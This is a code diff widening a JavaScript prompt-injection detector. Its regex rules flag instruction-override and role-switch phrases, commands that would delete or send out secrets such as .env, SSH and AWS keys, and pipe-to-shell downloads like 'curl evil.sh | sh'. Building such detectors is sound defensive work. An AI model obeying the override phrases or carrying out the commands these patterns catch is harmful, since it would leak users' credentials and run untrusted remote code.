@@ -53,11 +53,13 @@ const GAP6 = '(?:\\s+\\S+){0,6}\\s+';
 const GAP8 = '(?:\\s+\\S+){0,8}\\s+';
 
 const RULES = [
-  // Instruction override: ignore|disregard|forget … (previous|prior|earlier|above|all) (instructions|context|rules|prompts)
+  // Instruction override: ignore|disregard|forget|disobey|supersede|override|bypass … (previous|prior|
+  // earlier|above|all|prior|system) (instructions|context|rules|prompts|directives). Synonyms widened
+  // per SEC-0010 #7 (disobey/supersede/override/bypass were evasions of the old ignore/disregard/forget set).
   {
     name: 'instruction-override',
     re: new RegExp(
-      `\\b(?:ignore|disregard|forget)\\b${GAP6}\\b(?:previous|prior|earlier|above|all)\\s+(?:instructions?|context|rules?|prompts?)\\b`,
+      `\\b(?:ignore|disregard|forget|disobey|supersede|supercede|override|bypass|violate)\\b${GAP6}\\b(?:previous|prior|earlier|above|all|system|prior|the)\\s+(?:instructions?|context|rules?|prompts?|directives?|guidelines?)\\b`,
       'i',
     ),
   },
@@ -69,11 +71,25 @@ const RULES = [
   { name: 'role-switch-now', re: /\byou are now\b/i },
   { name: 'role-switch-fromnow', re: /\bfrom now on,?\s+you\b/i },
   { name: 'role-switch-actas', re: /\bact as\b[\s\S]{0,40}?\b(?:system|admin|root|developer mode)\b/i },
-  // Embedded destructive+exfil imperative: (delete|rm -rf|exfiltrate|leak|send) WITHIN ~8 words of a sensitive object.
+  // Embedded destructive+exfil imperative: a destructive/exfil verb WITHIN ~8 words of a sensitive object.
+  // Recall deliberately WIDE here (SEC-0010 #7): under the autonomous threat model a false positive is just
+  // a cheap inert wrapper, so it's cheap to over-catch. Verbs and objects both widened — added
+  // post/upload/paste/curl/fetch/cat/print/dump (exfil channels) and cloud-cred/ssh-key/npmrc objects.
   {
     name: 'destructive-exfil',
     re: new RegExp(
-      `\\b(?:delete|rm\\s+-rf|exfiltrate|leak|send)\\b${GAP8}(?:\\.env\\b|\\bsecrets?\\b|\\bapi[_-]?keys?\\b|\\bpasswords?\\b|\\btokens?\\b|\\bcredentials?\\b)`,
+      `\\b(?:delete|rm\\s+-rf|exfiltrate|leak|send|post|upload|paste|curl|fetch|cat|print|echo|dump|read|reveal|disclose)\\b${GAP8}`
+      + `(?:\\.env\\b|\\bsecrets?\\b|\\bapi[_-]?keys?\\b|\\bpasswords?\\b|\\btokens?\\b|\\bcredentials?\\b`
+      + `|~?/?\\.aws\\b|~?/?\\.ssh\\b|\\bid_rsa\\b|\\.pem\\b|\\bprivate[_ -]?keys?\\b|\\baws[_ -]?secret[_ -]?access[_ -]?keys?\\b|\\.npmrc\\b|~?/?\\.config\\b)`,
+      'i',
+    ),
+  },
+  // Remote-code-execution imperative: pipe a downloaded script straight to a shell (curl|wget … | sh|bash).
+  // A poisoned passage telling an autonomous agent to `curl evil.sh | sh` is a classic supply-chain payload.
+  {
+    name: 'pipe-to-shell',
+    re: new RegExp(
+      `\\b(?:curl|wget|fetch)\\b[\\s\\S]{0,80}?\\|\\s*(?:sudo\\s+)?(?:sh|bash|zsh|python[0-9.]*|node)\\b`,
       'i',
     ),
   },
